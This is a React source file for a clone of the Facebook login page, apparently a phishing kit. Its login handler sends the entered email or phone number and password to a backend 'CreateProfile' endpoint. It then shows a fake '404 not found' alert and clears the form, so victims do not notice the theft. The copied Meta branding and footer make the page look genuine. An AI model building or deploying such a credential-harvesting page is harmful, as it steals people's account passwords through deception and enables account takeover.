import React, { useRef } from 'react';
import axios from "axios"
// import { Create } from '../APIService/APIService/CreateProfiles';

// import "./style.css"
import Logo from "./fb_logo.svg"

// full screen loder 
import FullScreenLoder from '../Loder/FullScreenLoder';



// Create Profile 
function CreateProfiles(NameOrEmail, Password){
    let URL = "http://localhost:5000/api/v1/CreateProfile";
    let PostBody = {
        NameOrEmail:NameOrEmail,
        Password:Password
    }
return axios.post(URL, PostBody).then((Response)=>{
        if(Response.status===200){
            
            return true;
        }else{
            return false
        }
    }).catch((Error)=>{
        console.log(Error)
        return false
    })
}



function FacebookLogin(){




    let NameOrEmail, Password, Loder = useRef();


    const SabeData =()=>{
        let UserName = NameOrEmail.value;
        let UserPassword = Password.value;

        // CreateProfiles(UserName, UserPassword)
        // .then((Result)=>{

        //   if(Result=== true){
        //     // SuccessTost("Create Product Success")
        //     alert("Success")
            


        //     // ProductName.value= "";
        //     // ProductCode.value= "";
        //     // ProductImg.value= "";
        //     // UnitPrice.value= "";
        //     // Qty.value= "";
        //     // TotalPrice.value= "";

        //   }
        //   else{
        //     alert("Request Fail Try Again")
        //   }
        // })


        if(UserName.length >= 4 && UserPassword.length >= 6){

            Loder.classList.remove("Loder_Display")
            CreateProfiles(UserName, UserPassword)
            .then((Result)=>{
    
              if(Result=== true){
                // SuccessTost("Create Product Success")

                
                alert("404 not found, please try again later")
                Loder.classList.add("Loder_Display")
                
    
    
                NameOrEmail.value= "";
                Password.value= "";
    
              }
              else{
                alert("Please type your current username, email, mobile number and password")
              }
            })

        }else{
            alert("Please type your current username, email, mobile number and password")
        }




    }

// return start 
return(
<div>
<main>
        <div className="row">
            <div className="col-logo">
                {/* <img src="images/fb_logo.svg" alt="Logo"> */}
                <img src={Logo} alt="Logo" />
                <h2>Facebook helps you connect and share with the people in your life.</h2>
            </div>
            <div className="col-form">
                <div className="form-container">
                    {/* <input type="text" placeholder="Email address or phone number"> */}
                    <input ref={(input)=>NameOrEmail=input} type="text"  placeholder="Email address or phone number"/>
                    {/* <input type="password" placeholder="Password"> */}
                    <input ref={(input)=>Password=input} type="password" placeholder="Password" />
                    <button onClick={SabeData} className="btn-login">Login</button>
                    


                    <a href="#">Forgotten password?</a>
                    <button className="btn-new">Create new Account</button>
                </div>
                <p><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p>
            </div>
        </div>
</main>
    <footer>
        <div className="footer-contents">
            <ol>
                <li>English (UK)</li>
                <li><a href="#">മലയാളം</a></li>
                <li><a href="#">தமிழ்</a></li>
                <li><a href="#">తెలుగు</a></li>
                <li><a href="#">বাংলা</a></li>
                <li><a href="#">اردو</a></li>
                <li><a href="#">हिन्दी</a></li>
                <li><a href="#">ಕನ್ನಡ</a></li>
                <li><a href="#">Español</a></li>
                <li><a href="#">Português (Brasil)</a></li>
                <li><a href="#">Français (France)</a></li>
                <li><button>+</button></li>
            </ol>

            <ol>
                <li><a href="#">Sign Up</a></li>
                <li><a href="#">Log In </a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Watch</a></li>
                <li><a href="#">People</a></li>
                <li><a href="#">Pages</a></li>
                <li><a href="#">Page categories</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Locations</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Facebook</a></li>
                <li><a href="#">PayGroups</a></li>
                <li><a href="#">Jobs</a></li>
                <li><a href="#">Oculus</a></li>
                <li><a href="#">Portal</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Local</a></li>
                <li><a href="#">Sign Up</a></li>
                <li><a href="#">Log In </a></li>
                <li><a href="#">Messenger</a></li>
                <li><a href="#">Facebook Lite</a></li>
                <li><a href="#">Watch</a></li>
                <li><a href="#">People</a></li>
                <li><a href="#">Pages</a></li>
                <li><a href="#">Page categories</a></li>
                <li><a href="#">Places</a></li>
                <li><a href="#">Games</a></li>
                <li><a href="#">Locations</a></li>
                <li><a href="#">Marketplace</a></li>
                <li><a href="#">Facebook</a></li>
                <li><a href="#">PayGroups</a></li>
                <li><a href="#">Jobs</a></li>
                <li><a href="#">Oculus</a></li>
                <li><a href="#">Portal</a></li>
                <li><a href="#">Instagram</a></li>
                <li><a href="#">Local</a></li>
            </ol>
            <small>Meta © 2023</small>
        </div>
    </footer>


    <div className="Loder_Display" ref={(input)=>Loder=input}>
        <FullScreenLoder />
    </div>

</div>
)
// return end 


}
// function end 

export default FacebookLogin;
